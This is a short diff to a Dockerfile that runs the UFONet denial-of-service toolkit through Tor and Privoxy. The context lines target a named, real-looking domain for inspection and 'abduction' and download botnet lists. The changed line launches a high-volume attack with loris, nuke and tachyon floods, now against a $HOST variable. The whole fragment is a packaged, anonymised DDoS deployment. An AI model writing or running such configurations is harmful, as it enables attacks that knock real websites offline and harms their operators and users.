@@ -48,4 +48,4 @@ CMD sudo service tor start && sudo service privoxy start && \
     ./ufonet -i 'https://lasgsafetyreg.com' --force-yes && \ 
     ./ufonet -x 'https://lasgsafetyreg.com' --force-yes && \ 
     ./ufonet --download-github --force-yes && \ 
-    ./ufonet  --threads 20  -a 'https://lasgsafetyreg.com' --force-yes -r 10000 --loris 500 --db "search.php?q=" --nuke 10000 --tachyon 1000 && \ 
+    ./ufonet  --threads 20  -a $HOST --force-yes -r 10000 --loris 500 --db "search.php?q=" --nuke 10000 --tachyon 1000 && \ 
